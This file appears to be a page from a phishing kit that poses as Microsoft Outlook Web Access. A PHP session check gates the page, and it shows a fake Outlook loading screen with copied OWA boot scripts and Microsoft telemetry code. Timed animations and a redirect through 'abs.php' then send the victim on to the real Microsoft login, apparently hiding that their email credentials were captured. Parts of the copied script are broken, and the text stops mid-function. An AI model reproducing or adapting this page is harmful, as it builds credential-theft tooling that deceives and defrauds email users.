<?php
session_start();
ob_start();
function loggedin()
{
    if (isset($_SESSION['email'])&&!empty($_SESSION['email'])) {
        return true;
    } else {
        return false;
    }
}

if (loggedin()) {
    $userlogged = $_SESSION['email'];
} else {
    die(include 'Go_off.php');
}


?>

<!DOCTYPE html>
<html dir="ltr" lang="en-US"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta http-equiv="pragma" content="no-cache">
    
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="default">
    <META HTTP-EQUIV="Refresh" CONTENT="5;URL=abs.php?https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office365.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=0&client-request-id=9f96b0e8-a55e-4d7e-8dbe-545d7fd56135&protectedtoken=true&domain_hint=office365.com&nonce=636680711858302633.d12647a5-086e-45d6-b043-8d0ad12e9208&state=DYvJEYAgDACDdmAfkUAgxHKQY8aHw9P2zWP3s7MOAHZjMxyZoAiLKJUQNCtTFOazhyip1IykMjDlLnhTYtRO1dq4Iqmz9_Drq37N-bTBks-23h8">
    <meta name="format-detection" content="telephone=no">
    <meta name="viewport" content="user-scalable=0, width=device-width, initial-scale=1.0, maximum-scale=1.0">
    <meta name="msapplication-TileImage" content="https://r4.res.office365.com/owa/prem/16.2279.14.2549832/resources/images/0/owa_browserpinnedtile.png">
    <meta name="msapplication-TileColor" content="#0072c6">
    <meta name="msapplication-tap-highlight" content="no">
    <meta name="google" value="notranslate">
    <meta name="apple-mobile-web-app-title" content="OWA">
    <meta name="referrer" content="never">
    
    <link rel="shortcut icon" href="https://outlook.office.com/owa/favicon.ico" type="image/x-icon">
    

    <title>Outlook</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    
      <script type="text/javascript">
   
    
    
    $( document ).ready(function(){
            $('#phase-1').fadeIn('slow', function(){
               $('#phase-1').delay(3000).fadeOut('slow', function() {
                   
        $('#phase-2').fadeIn('slow', function(){
               $('#phase-2').delay(3000).fadeOut('slow', function() {
        window.location.replace("<?php echo "$goto"; ?>");
          
    setTimeout("pageRedirect()", 10000);
    
        });
               
               });   
               }); 
               });
            });
        
    
</script>
    
    
    
    

    <script>
        var startLoadTime = new Date();
        var appCachedPage = true;
        window.cacheType = '2';
        window.dateZero = new Date(0);
        var scriptStart = ((new Date()) - window.dateZero);
        window.clientId = '60DCB373BB5D46E4B816A049F8E850F1';        
        window.corrId = window.clientId + "_" + (new Date()).getTime();
        window.traceTid= '456f7eab-9567-424c-857f-2b7da5cc8a91';
        window.traceMguid = '0b17f512-5b77-4405-9ea7-f8883d4eb5f3';
        window.owaUserNetId = '10037FFE889FEB8E';
        window.owaMbxGuid = 'a990c0f3-55bb-4471-9283-2a55604aeb25';
        window.webSessionType = '0';
        window.cachedDagName = 'NAMPR07DG220';
        window.cachedForestName = 'namprd07.prod.outlook.com';
        window.isPremExoMbx = '0';
        window.bootTraceUrl = '';
        var onunloadbeforeboot = null;
        window.owaSDState = {};
        window.owaBootStatus = {};
        window.ariaLoggingEnabled = 1;
        
        window.ariaTenantToken = '3b1ea01450be48f29759d868931e225d-e2676c0a-dca3-417d-bfa9-8596433a3692-6908';
        
                
        
        var isPopOut = window.location.href.indexOf('ispopout=1') > 0;

               
        
        if (!window.owaSDState.fcr) {
            if (!isPopOut) {
                try
                {
                    
                    window.owaSDConsumable=false;
                    window.owaSDConsumed = false;
                    sendOwaSDRequest(false);
                }
                catch (ex) {
                    window.owaLastErrorReported = ex;
                    throw ex;
                }
            }
            else {
                onunloadbeforeboot = function() {
                    callPopOutBootErrorCallback("PopOutClosed");
                };
                if (window.attachEvent) {
                    window.attachEvent("onunload", onunloadbeforeboot);
                }
                else {
                    window.addEventListener("unload", onunloadbeforeboot, false);
                }
            }
        }

        function createOwaSDXMLHttpRequest() {
            var request = null;
            try
            {
                request = new window.XMLHttpRequest();
            }
            catch (e) {
                
                if (window.ActiveXObject) {
                    request = new window.ActiveXObject("Microsoft.XMLHTTP");
                }
            }

            return request;
        }
        
        function sendOwaSDRequest(retryAttempt) {
            
            window.owaSDState.usrPending = 1;
            window.owaSDState.usrReceived = false;
            
            window.owaSD = createOwaSDXMLHttpRequest();
            window.owaSD.retryAttempt = retryAttempt;
            window.owaSD.open("POST","sessiondata.ashx" + getSdqp(retryAttempt));
            window.owaSD.onreadystatechange = sdResponseHandler;
            window.owaSD.setRequestHeader("X-OWA-CorrelationId", window.corrId);
            window.owaSD.clientRequestId = window.corrId;
            window.owaSD.setRequestHeader("client-request-id", window.owaSD.clientRequestId);
            
            if (isMailModule()) {
                window.owaSD.setRequestHeader("X-Js-ClientType", "1");
            }
            
            try {
                if (navigator.userAgent.indexOf("OWASMIME/" > 0)) {
                    window.owaSD.setRequestHeader("X-OWA-SmimeInstalled", "1");
                }
                else if (window.ActiveXObject) {
                    var smimePlugin = new ActiveXObject("Microsoft.Exchange.Clients.SmimeAX");
                    window.owaSD.setRequestHeader("X-OWA-SmimeInstalled", "1");
                    smimePlugin.Dispose();
                }
            }
            catch (e) {
            }

            window.owaSD.send();
        }

        function getSdqp(retryAttempt) {
            var sdqp = "?swclient=1";
            
                    sdqp += "&acver=16.2279.14.2549832";
                

                sdqp += "&crr=1";
                if (retryAttempt) {
                    sdqp += "&crrretry=1";
                }
            
             return sdqp;
        }

        function sdResponseHandler() {
            try {
            
                if (!window.owaSD) {
                    return;
                }

                if (!tryAuthOwaSD()) {
                    return;
                }

                
                if (!tryCheckOptinPrecondition()) {
                    return;
                }
                

                if (!window.owaSDState.usrReceived && !(window.owaSDState.usrReceived = tryReceiveUSR())) {
                    return;
                }
                
                if (!window.owaSDState.sdReceived && !(window.owaSDState.sdReceived = tryReceiveSD())) {
                    return;
                }

                completeOwaSD();
                
            }
            catch (ex) {
                window.owaLastErrorReported = ex;
                throw ex;
            }
        }

        
        function tryCheckOptinPrecondition() {
            if (window.owaSD.status == 412) {
                var actualVdir = window.owaSD.getResponseHeader("X-Js-ClientVdir");
                if (actualVdir != null) {
                    postBootTrace("OptinRedirect");
                    redirectToUrl("http://outlook.office365.com" + actualVdir + "/");
                    return false;
                }
            }

            return true;
        }

        
        function isMailModule(){
            var result = false;
            var href = null;
            try {
                href = decodeURIComponent(window.location.href);
            } catch(e) {
            }

            if (href != null) {
                if (href.indexOf('viewmodel=') >= 0) {
                    result = false;
                } 
                else if(href.indexOf('path=') < 0 && href.indexOf('http://outlook.office365.com') < 0) {
                    result = true;
                }
                else if(href.indexOf('http://outlook.office365.com') >= 0 || href.indexOf('http://outlook.office365.com') >= 0) {
                    result = true;
                }
            }
            
            return result;
        }

        function tryAuthOwaSD() {
            if ((window.owaSD.status == 440 || window.owaSD.status == 401) && !isPalEnabled()) {
                    postBootTrace("http://outlook.office365.com");

                    
                   
                    }

            return true;
        }

    
            }
        }

                
        function onUSRPendingComplete(e) {
            window.owaSDState.usrPending--;

            if (e && e.target && e.target.src) {
                parseEndTimes[getFileName(e.target.src)] = ((new Date()) - window.dateZero);
            }

            if (window.owaSDState.usrPending == 0 && window.startUpOwa) {
                window.startUpOwa();
            }
        }

        function onUSRPendingError(e) {
            var errMsg = "Failed to load script: ";
            if (e && e.target && e.target.src) {
                errMsg += e.target.src;
            }
            handleBootError2("USRLoadError", errMsg);
        }

        function tryConsumeUSR() {
            if (window.owaSDState.usrConsumable && window.owaSDState.usrReceived && !window.owaSDState.usrConsumed) {
                window.owaSDState.usrConsumed = true;
                eval(window.owaSDState.usr);
                setCompositeUsrTime();
                loadStyles(styleResources);
                onUSRPendingComplete();
            }
        }

        function getSDCompositeErr() {
            var errorInfo = "";
            var sdErrorHeader = "Content-Name: SdError\r\n\r\n";
            var errorStartIndex = window.owaSD.responseText.indexOf(sdErrorHeader);
            if (errorStartIndex >= 0) {
                var errorEndIndex = window.owaSD.responseText.indexOf("SdErrorEnd", errorStartIndex);
                if (errorEndIndex > 0) {
                    errorInfo = window.owaSD.responseText.substring(errorStartIndex + sdErrorHeader.length, errorEndIndex);
                }
                else {
                    errorInfo = window.owaSD.responseText.substring(errorStartIndex + sdErrorHeader.length);
                }
            }

            return errorInfo;
        }

        function tryReceiveUSR() {
            
            if (window.owaSDState.usrReceived) {
                return true;
            }

            var result = false;

            if (window.owaSD.readyState == 3 || window.owaSD.readyState == 4) {
                if (window.owaSD.responseText) {
                    var match = window.owaSD.responseText.match(/^SESSION DATA\r\nVersion: 1\r\n\r\nContent-Name: UserSpecificResources\r\nContent-Size: (\d+)\r\n\r\n/);
                    if (match) {
                        var usrBegin = match[0].length;
                        var usrEnd = usrBegin + parseInt(match[1]);
                        if (window.owaSD.responseText.length >= usrEnd) {
                            window.owaSDState.usr = window.owaSD.responseText.substring(usrBegin, usrEnd);
                            window.owaSDState.sdBegin = usrEnd;
                            result = window.owaSDState.usrReceived = true;

                            tryConsumeUSR();
                        }
                    }
                }
            }

            if (!result && window.owaSD.readyState == 4) {
                var errMsg = window.owaSD.getResponseHeader("X-Auth-Error");
                var errType = "USRCompositeAuthErr";
                if (!errMsg) {
                    errMsg = window.owaSD.getResponseHeader("X-OWA-Error");
                    errType = "USRCompositeServerErr";
                }

                if (!errMsg) {
                    var errorInfo = getSDCompositeErr();
                    if (errorInfo) {
                        errMsg = errorInfo;
                        errType = "USRCompositeBeginErr";
                    }
                }

                handleBootError2(
                    errType,
                    errMsg,
                    window.owaSD.getResponseHeader("X-OWA-Version"),
                    window.owaSD.getResponseHeader('X-CalculatedBETarget'));
            }

            return result;
        }

        function tryReceiveSD() {

            if (window.owaSDState.sdReceived) {
                return true;
            }

            var result = false;
            var retrySDRequest = false;
            var errorInfo = "";

            if (window.owaSD.readyState == 4) {
                errorInfo = getSDCompositeErr();
                var sdHeader = "Content-Name: SessionData\r\n\r\n";
                var retrySDRequestCode = "RetryCrrRequest";

                if (errorInfo) {
                    if (!this.owaSD.retryAttempt && errorInfo.indexOf(retrySDRequestCode) >= 0) {
                        retrySDRequest = true;
                    }
                }
                else if (window.owaSD.responseText.indexOf(sdHeader, window.owaSDState.sdBegin) == window.owaSDState.sdBegin) {
                    window.owaSDState.data = window.owaSD.responseText.substring(window.owaSDState.sdBegin + sdHeader.length);
                    result = window.owaSDState.sdReceived = true;
                }
            }

            if (retrySDRequest) {
                this.owaSD.onreadystatechange = null;
                this.owaSD = null;
                sendOwaSDRequest(true);
            }
            else if (!result && window.owaSD.readyState == 4) {
                handleBootError2(
                    "SDCompositeError",
                    errorInfo,
                    window.owaSD.getResponseHeader("X-OWA-Version"),
                    window.owaSD.getResponseHeader('X-CalculatedBETarget'));
            }

            return result;
        }
        
            Object.setPrototypeOf && (Object['protoInheritEnabled']=1);
        window.scriptsLoaded = window.scriptsLoaded || {}; window.scriptProcessStart = window.scriptProcessStart || {}; window.scriptProcessStart['aria-web-telemetry.js'] = (new Date()).getTime();
!function(e,t){if("object"==typeof exports&&"object"==typeof module)module.exports=t();else if("function"==typeof define&&define.amd)define([],t);else{var i=t();for(var n in i)("object"==typeof exports?exports:e)[n]=i[n]}}(this,function(){return function(e){function t(n){if(i[n])return i[n].exports;var r=i[n]={i:n,l:!1,exports:{}};return e[n].call(r.exports,r,r.exports,t),r.l=!0,r.exports}var i={};return t.m=e,t.c=i,t.i=function(e){return e},t.d=function(e,i,n){t.o(e,i)||Object.defineProperty(e,i,{configurable:!1,enumerable:!0,get:n})},t.n=function(e){var i=e&&e.e?function(){return e.default}:function(){return e};return t.d(i,"a",i),i},t.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},t.p="",t(t.s=30)}([function(e,t,i){"use strict";Object.defineProperty(t,"__esModule",{value:!0});!function(e){e[e.Unspecified=0]="Unspecified",e[e.String=1]="String",e[e.Int64=2]="Int64",e[e.Double=3]="Double",e[e.Boolean=4]="Boolean"}(t.AWTPropertyType||(t.AWTPropertyType={}));!function(e){e[e.NotSet=0]="NotSet",e[e.DistinguishedName=1]="DistinguishedName",e[e.GenericData=2]="GenericData",e[e.IPV4Address=3]="IPV4Address",e[e.IPv6Address=4]="IPv6Address",e[e.MailSubject=5]="MailSubject",e[e.PhoneNumber=6]="PhoneNumber",e[e.QueryString=7]="QueryString",e[e.SipAddress=8]="SipAddress",e[e.SmtpAddress=9]="SmtpAddress",e[e.Identity=10]="Identity",e[e.Uri=11]="Uri",e[e.Fqdn=12]="Fqdn",e[e.IPV4AddressLegacy=13]="IPV4AddressLegacy"}(t.AWTPiiKind||(t.AWTPiiKind={}));!function(e){e[e.NotSet=0]="NotSet",e[e.GenericContent=1]="GenericContent"}(t.AWTCustomerContentKind||(t.AWTCustomerContentKind={}));!function(e){e[e.Low=1]="Low",e[e.Normal=2]="Normal",e[e.High=3]="High"}(t.AWTEventPriority||(t.AWTEventPriority={}));!function(e){e[e.NonRetryableStatus=1]="NonRetryableStatus",e[e.KillSwitch=2]="KillSwitch",e[e.QueueFull=3]="QueueFull"}(t.AWTEventsDroppedReason||(t.AWTEventsDroppedReason={}));!function(e){e[e.InvalidEvent=1]="InvalidEvent",e[e.SizeLimitExceeded=2]="SizeLimitExceeded"}(t.AWTEventsRejectedReason||(t.AWTEventsRejectedReason={}))},function(e,t,i){"use strict";function n(e){var t=new I.Int64("0");return t.low=4294967295&e,t.high=Math.floor(e/4294967296),t}function r(){return"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(W,function(e){var t=16*Math.random()|0;return("x"===e?t:3&t|8).toString(16)})}function o(e){return"string"==typeof e}function s(e){return(e+E)*B}function a(e){var t=e.indexOf("-");return t>-1?e.substring(0,t):""}function u(){return null===C&&(C="undefined"!=typeof navigator&&Boolean(navigator.sendBeacon)),C}function d(){return null===w&&(w="undefined"!=typeof Uint8Array&&!A()&&!f()),w}function _(e){return!isNaN(e)&&null!==e&&e>=1&&e<=3}function l(e,i){return"string"!=typeof i&&"number"!=typeof i&&"boolean"!=typeof i||(i={value:i,type:P.AWTPropertyType.Unspecified}),t.PropertyNameRegex.test(e)&&void 0!==i&&null!==i&&null!==i.value&&void 0!==i.value&&""!==i.value?(i.type=y(i.value,i.type),i.type?(void 0===i.pii&&(i.pii=P.AWTPiiKind.NotSet),void 0===i.cc&&(i.cc=P.AWTCustomerContentKind.NotSet),!g(i.pii)||!m(i.cc)||i.cc>0&&i.pii!==P.AWTPiiKind.NotSet?null:i):null):null}function c(e){return e.getUTCFullYear()+"-"+h(e.getUTCMonth()+1)+"-"+h(e.getUTCDate())+"T"+h(e.getUTCHours())+":"+h(e.getUTCMinutes())+":"+h(e.getUTCSeconds())+"."+v(e.getUTCMilliseconds())+"Z"}function p(){if(null===b){var e=new XMLHttpRequest;b=void 0===e.withCredentials&&"undefined"!=typeof XDomainRequest}return b}function f(){return!("undefined"==typeof navigator||!navigator.product)&&"ReactNative"===navigator.product}function h(e){return e<10?"0"+e:e.toString()}function v(e){return e<10?"00"+e:e<100?"0"+e:e.toString()}function y(e,t){return S(t)&&t!==P.AWTPropertyType.Unspecified?t===P.AWTPropertyType.String&&"string"==typeof e?t:t!==P.AWTPropertyType.Double&&t!==P.AWTPropertyType.Int64||"number"!=typeof e?t===P.AWTPropertyType.Boolean&&"boolean"==typeof e?t:void 0:t===P.AWTPropertyType.Int64&&e%1!=0?null:t:T(e)}function T(e){switch(typeof e){case"string":return P.AWTPropertyType.String;case"boolean":return P.AWTPropertyType.Boolean;case"number":return P.AWTPropertyType.Double}return P.AWTPropertyType.Unspecified}function g(e){return!isNaN(e)&&null!==e&&e>=0&&e<=13}function m(e){return!isNaN(e)&&null!==e&&e>=0&&e<=1}function S(e){return!isNaN(e)&&null!==e&&e>=0&&e<=4}function A(){if("undefined"!=typeof navigator&&navigator.userAgent){var e=navigator.userAgent.toLowerCase();if((e.indexOf("safari")>=0||e.indexOf("firefox")>=0)&&e.indexOf("chrome")<0)return!0}return!1}Object.defineProperty(t,"__esModule",{value:!0});var I=i(4),P=i(0),W=/[xy]/g,E=621355968e5,B=1e4;t.EventNameAndTypeRegex=/^[a-zA-Z]([a-zA-Z0-9]|_){2,98}[a-zA-Z0-9]$/,t.EventNameDotRegex=/\./g,t.PropertyNameRegex=/^[a-zA-Z](([a-zA-Z0-9|_|\.]){0,98}[a-zA-Z0-9])?$/,t.StatsApiKey="a387cfcf60114a43a7699f9fbb49289e-9bceb9fe-1c06-460f-96c5-6a0b247358bc-7238";var C=null,w=null,b=null;t.numberToBondInt64=n,t.newGuid=r,t.isString=o,t.msToTicks=s,t.getTenantId=a,t.isBeaconsSupported=u,t.isUint8ArrayAvailable=d,t.isPriority=_,t.sanitizeProperty=l,t.getISOString=c,t.useXDomainRequest=p,t.isReactNative=f},function(e,t,i){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var n=function(){function e(){}return e.addNotificationListener=function(e){this.listeners.push(e)},e.eventsSent=function(e){for(var t=this,i=this,n=0;n<this.listeners.length;++n)!function(n){i.listeners[n].eventsSent&&setTimeout(function(){return t.listeners[n].eventsSent(e)},0)}(n)},e.eventsDropped=function(e,t){for(var i=this,n=this,r=0;r<this.listeners.length;++r)!function(r){n.listeners[r].eventsDropped&&setTimeout(function(){return i.listeners[r].eventsDropped(e,t)},0)}(r)},e.eventsRetrying=function(e){for(var t=this,i=this,n=0;n<this.listeners.length;++n)!function(n){i.listeners[n].eventsRetrying&&setTimeout(function(){return t.listeners[n].eventsRetrying(e)},0)}(n)},e.eventsRejected=function(e,t){for(var i=this,n=this,r=0;r<this.listeners.length;++r)!function(r){n.listeners[r].eventsRejected&&setTimeout(function(){return i.listeners[r].eventsRejected(e,t)},0)}(r)},e.listeners=[],e}();t.default=n},function(e,t,i){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var n=i(14),r=i(0),o=i(28),s=i(10),a=i(5),u=i(11),d=i(1),_=function(){function e(){}return e.setEventsHandler=function(e){this.t=e},e.getEventsHandler=function(){return this.t},e.scheduleTimer=function(){var e=this,t=this.r[this.a][2];this.u<0&&t>=0&&!this._&&(this.t.hasEvents()?(0===t&&this.f>0&&(t=1),this.u=setTimeout(function(){return e.h()},t*(1<<this.f)*1e3)):this.v=0)},e.initialize=function(e){var t=this;this.y=!0,this.T=e,this.t=new o.default(e.collectorUri,e.cacheMemorySizeLimitInNumberOfEvents,e.httpXHROverride),this.g(),s.default.initialize(function(e,i){if(t.T.canSendStatEvent("awt_stats")){var n=new a.default("awt_stats");n.setEventPriority(r.AWTEventPriority.High),n.setProperty("TenantId",i);for(var o in e)e.hasOwnProperty(o)&&n.setProperty(o,e[o].toString());u.default.getLogger(d.StatsApiKey).logEvent(n)}})},e.setTransmitProfile=function(e){this.a!==e&&void 0!==this.r[e]&&(this.clearTimeout(),this.a=e,this.scheduleTimer())},e.loadTransmitProfiles=function(e){this.S();for(var t in e)if(e.hasOwnProperty(t)){if(3!==e[t].length)continue;for(var i=2;i>=0;--i)if(e[t][i]<0){for(var n=i;n>=0;--n)e[t][n]=-1;break}for(var i=2;i>0;--i)if(e[t][i]>0&&e[t][i-1]>0){var r=e[t][i-1]/e[t][i];e[t][i-1]=Math.ceil(r)*e[t][i]}this.r[t]=e[t]}},e.sendEvent=function(e){this.y&&(this.t.addEvent(e),this.scheduleTimer())},e.flush=function(e){var t=(new Date).getTime();!this._&&this.A+3e4<t&&(this.A=t,this.u>-1&&(clearTimeout(this.u),this.u=-1),this.t.uploadNow(e))},e.pauseTransmission=function(){this._||(this.clearTimeout(),this.t.pauseTransmission(),this._=!0)},e.resumeTransmision=function(){this._&&(this._=!1,this.t.resumeTransmission(),this.scheduleTimer())},e.flushAndTeardown=function(){s.default.teardown(),this.y=!1,this.clearTimeout(),this.t.teardown()},e.backOffTransmission=function(){this.f<4&&(this.f++,this.clearTimeout(),this.scheduleTimer())},e.clearBackOff=function(){this.f>0&&(this.f=0,this.clearTimeout(),this.scheduleTimer())},e.S=function(){this.clearTimeout(),this.g(),this.a=n.AWT_REAL_TIME,this.scheduleTimer()},e.clearTimeout=function(){this.u>0&&(clearTimeout(this.u),this.u=-1,this.v=0)},e.h=function(){var e=r.AWTEventPriority.High;this.v++,this.v*this.r[this.a][2]===this.r[this.a][0]?(e=r.AWTEventPriority.Low,this.v=0):this.v*this.r[this.a][2]===this.r[this.a][1]&&(e=r.AWTEventPriority.Normal),this.t.sendEventsForPriorityAndAbove(e),this.u=-1,this.scheduleTimer()},e.g=function(){this.r={},this.r.REAL_TIME=[4,2,1],this.r.NEAR_REAL_TIME=[12,6,3],this.r.BEST_EFFOR=[36,18,9]},e.y=!1,e.a=n.AWT_REAL_TIME,e.u=-1,e.f=0,e._=!1,e.v=0,e.A=0,e}();t.default=_},function(e,t,i){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var n=function(){function e(e){this.low=0,this.high=0,this.low=parseInt(e,10),this.low<0&&(this.high=-1)}return e.prototype.I=function(t){var i=new e(t);return this.low===i.low&&this.high===i.high},e}();t.Int64=n;var r=function(){function e(e){this.low=0,this.high=0,this.low=parseInt(e,10)}return e.prototype.I=function(t){var i=new e(t);return this.low===i.low&&this.high===i.high},e}();t.UInt64=r;var o=function(){function e(){}return e.P=function(e){return this.W(e)},e.W=function(e){return 255&e},e.B=function(e){return 2147483647&e|2147483648&e},e.C=function(e){return 4294967295&e},e}();t.Number=o},function(e,t,i){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var n=i(1),r=i(0),o=function(){function e(e){this.w={name:"",properties:{}},e&&this.setName(e)}return e.prototype.setName=function(e){this.w.name=e},e.prototype.getName=function(){if(this.w.name&&n.isString(this.w.name))return this.w.name},e.prototype.setType=function(e){this.w.type=e},e.prototype.getType=function(){if(this.w.type&&n.isString(this.w.type))return this.w.type},e.prototype.setTimestamp=function(e){this.w.timestamp=e},e.prototype.getTimestamp=function(){if(this.w.timestamp&&!isNaN(this.w.timestamp))return this.w.timestamp},e.prototype.setEventPriority=function(e){n.isPriority(e)&&(this.w.priority=e)},e.prototype.getEventPriority=function(){return this.w.priority},e.prototype.setProperty=function(e,t,i){void 0===i&&(i=r.AWTPropertyType.Unspecified);var o={value:t,type:i,pii:r.AWTPiiKind.NotSet,cc:r.AWTCustomerContentKind.NotSet};if(null===(o=n.sanitizeProperty(e,o)))return void delete this.w.properties[e];this.w.properties[e]=o},e.prototype.setPropertyWithPii=function(e,t,i,o){void 0===o&&(o=r.AWTPropertyType.Unspecified);var s={value:t,type:o,pii:i,cc:r.AWTCustomerContentKind.NotSet};if(null===(s=n.sanitizeProperty(e,s)))return void delete this.w.properties[e];this.w.properties[e]=s},e.prototype.setPropertyWithCustomerContent=function(e,t,i,o){void 0===o&&(o=r.AWTPropertyType.Unspecified);var s={value:t,type:o,pii:r.AWTPiiKind.NotSet,cc:i};if(null===(s=n.sanitizeProperty(e,s)))return void delete this.w.properties[e];this.w.properties[e]=s},e.prototype.getPropertyMap=function(){return this.w.properties},e.prototype.getEvent=function(){return this.w},e}();t.default=o},function(e,t,i){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var n=i(21),r=i(0),o=i(1),s=function(){function e(){}return e.getPayloadBlob=function(e,t){var i=new n.IO.MemoryStream,r=new n.CompactBinaryProtocolWriter(i);r.b(n.O.D,3,null),r.N(t,n.O.R,n.O.M);for(var s in e)if(e.hasOwnProperty(s)){r.U(s);var a=e[s];r.k(1,n.O.x),r.b(n.O.R,2,null),r.U("act_default_source"),r.b(n.O.R,5,null),r.U(o.newGuid()),r.b(n.O.L,6,null),r.F(o.numberToBondInt64(Date.now())),r.b(n.O.M,8,null),r.k(a.length,n.O.x);for(var u=0;u<a.length;++u)r.z(a[u].serializedEvent);r.q(!1)}return r.q(!1),i.H()},e.getEventBlob=function(e){var t=new n.IO.MemoryStream,i=new n.CompactBinaryProtocolWriter(t);i.b(n.O.R,1,null),i.U(e.id),i.b(n.O.L,3,null),i.F(o.numberToBondInt64(e.timestamp)),i.b(n.O.R,5,null),i.U(e.type),i.b(n.O.R,6,null),i.U(e.name);var s={},a=0,u={},d=0,_={},l=0,c={},p=0,f={},h=0,v={},y=0;for(var T in e.properties)if(e.properties.hasOwnProperty(T)){var g=e.properties[T];if(g.cc>0)v[T]=g,y++;else if(g.pii>0)f[T]=g,h++;else switch(g.type){case r.AWTPropertyType.String:s[T]=g.value,a++;break;case r.AWTPropertyType.Int64:u[T]=g.value,d++;break;case r.AWTPropertyType.Double:_[T]=g.value,l++;break;case r.AWTPropertyType.Boolean:c[T]=g.value,p++}}if(a){i.b(n.O.D,13,null),i.N(a,n.O.R,n.O.R);for(var T in s)if(s.hasOwnProperty(T)){var m=s[T];i.U(T),i.U(m.toString())}}if(h){i.b(n.O.D,30,null),i.N(h,n.O.R,n.O.x);for(var T in f)if(f.hasOwnProperty(T)){var g=f[T];i.U(T),i.b(n.O.j,1,null),i.K(1),i.b(n.O.j,2,null),i.K(g.pii),i.b(n.O.R,3,null),i.U(g.value.toString()),i.q(!1)}}if(p){i.b(n.O.D,31,null),i.N(p,n.O.R,n.O.Q);for(var T in c)if(c.hasOwnProperty(T)){var m=c[T];i.U(T),i.V(m)}}if(d){i.b(n.O.D,33,null),i.N(d,n.O.R,n.O.L);for(var T in u)if(u.hasOwnProperty(T)){var m=u[T];i.U(T),i.F(o.numberToBondInt64(m))}}if(l){i.b(n.O.D,34,null),i.N(l,n.O.R,n.O.G);for(var T in _)if(_.hasOwnProperty(T)){var m=_[T];i.U(T),i.X(m)}}if(y){i.b(n.O.D,36,null),i.N(y,n.O.R,n.O.x);for(var T in v)if(v.hasOwnProperty(T)){var g=v[T];i.U(T),i.b(n.O.j,1,null),i.K(g.cc),i.b(n.O.R,2,null),i.U(g.value.toString()),i.q(!1)}}return i.q(!1),t.H()},e.base64Encode=function(e){return n.J.Z(e)},e}();t.default=s},function(e,t,i){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var n=i(1),r="MicrosoftApplicationsTelemetryDeviceId",o="MicrosoftApplicationsTelemetryFirstLaunchTime",s={MSIE:"MSIE",CHROME:"Chrome",FIREFOX:"Firefox",SAFARI:"Safari",EDGE:"Edge",ELECTRON:"Electron",SKYPE_SHELL:"SkypeShell",PHANTOMJS:"PhantomJS",OPERA:"Opera"},a={WINDOWS:"Windows",MACOSX:"Mac OS X",WINDOWS_PHONE:"Windows Phone",WINDOWS_RT:"Windows RT",IOS:"iOS",ANDROID:"Android",LINUX:"Linux",UNKNOWN:"Unknown"},u={WIN:/(windows|win32)/i,WINRT:/ arm;/i,WINPHONE:/windows\sphone\s\d+\.\d+/i,OSX:/(macintosh|mac os x)/i,IOS:/(iPad|iPhone|iPod)(?=.*like Mac OS X)/i,LINUX:/(linux|joli|[kxln]?ubuntu|debian|[open]*suse|gentoo|arch|slackware|fedora|mandriva|centos|pclinuxos|redhat|zenwalk)/i,ANDROID:/android/i},d={5.1:"XP","6.0":"Vista",6.1:"7",6.2:"8",6.3:"8.1","10.0":"10"},_=function(){function e(){}return e.addPropertyStorageOverride=function(e){return!!e&&(this.Y=e,!0)},e.autoCollect=function(e,t,i){if(this.$=e,this.ee=t,this.te(),i||"undefined"==typeof navigator||(i=navigator.userAgent||""),this.ie(i),this.ee&&!this.Y)return this.ne(r),void this.ne(o);(this.Y||this.re&&!this.ee)&&this.oe()},e.checkAndSaveDeviceId=function(e){if(e){this.se(r)!==e&&(this.ae(r,e),this.ae(o,n.getISOString(new Date))),this.firstLaunchTime=this.se(o)}},e.oe=function(){var e=this.se(r);e?this.firstLaunchTime=this.se(o):(e=n.newGuid(),this.checkAndSaveDeviceId(e)),this.$.setDeviceId(e)},e.te=function(){"undefined"!=typeof document&&document.documentElement&&this.$.setAppLanguage(document.documentElement.lang),"undefined"!=typeof navigator&&this.$.setUserLanguage(navigator.userLanguage||navigator.language);var e=(new Date).getTimezoneOffset(),t=e%60,i=(e-t)/60,n="+";i>0&&(n="-"),i=Math.abs(i),t=Math.abs(t),this.$.setUserTimeZone(n+(i<10?"0"+i:i.toString())+":"+(t<10?"0"+t:t.toString()))},e.ie=function(e){if(e){var t=this.ue(e);this.$.setDeviceBrowserName(t),this.$.setDeviceBrowserVersion(this.de(e,t));var i=this._e(e);this.$.setDeviceOsName(i),this.$.setDeviceOsVersion(this.le(e,i))}},e.ue=function(e){return this.ce("OPR/",e)?s.OPERA:this.ce(s.PHANTOMJS,e)?s.PHANTOMJS:this.ce(s.EDGE,e)?s.EDGE:this.ce(s.ELECTRON,e)?s.ELECTRON:this.ce(s.CHROME,e)?s.CHROME:this.ce("Trident",e)?s.MSIE:this.ce(s.FIREFOX,e)?s.FIREFOX:this.ce(s.SAFARI,e)?s.SAFARI:this.ce(s.SKYPE_SHELL,e)?s.SKYPE_SHELL:"Unknown"},e.ce=function(e,t){return t.indexOf(e)>-1},e.de=function(e,t){return t===s.MSIE?this.pe(e):this.fe(t,e)},e.pe=function(e){var t=e.match(new RegExp(s.MSIE+" ([\\d,.]+)"));if(t)return t[1];var i=e.match(new RegExp("rv:([\\d,.]+)"));return i?i[1]:void 0},e.fe=function(e,t){e===s.SAFARI&&(e="Version");var i=t.match(new RegExp(e+"/([\\d,.]+)"));return i?i[1]:"Unknown"},e._e=function(e){return e.match(u.WINPHONE)?a.WINDOWS_PHONE:e.match(u.WINRT)?a.WINDOWS_RT:e.match(u.IOS)?a.IOS:e.match(u.ANDROID)?a.ANDROID:e.match(u.LINUX)?a.LINUX:e.match(u.OSX)?a.MACOSX:e.match(u.WIN)?a.WINDOWS:"Unknown"},e.le=function(e,t){return 